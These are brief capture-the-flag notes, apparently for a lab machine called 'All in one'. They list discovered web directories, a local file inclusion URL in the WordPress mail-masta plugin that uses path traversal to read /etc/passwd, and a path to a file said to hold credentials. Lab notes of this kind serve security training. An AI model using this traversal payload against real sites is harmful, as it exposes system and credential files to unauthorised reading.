# All in one
> ExportIP :  10.10.216.98


## Dir Tree
```
[Hidden]
: http://10.10.216.98/hackathons
: http://10.10.216.98/wordpress
```

## LFI Point
```
10.10.216.98/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../../../etc/passwd
```

## Credential Path
```
/etc/mysql/conf.d/private.txt
```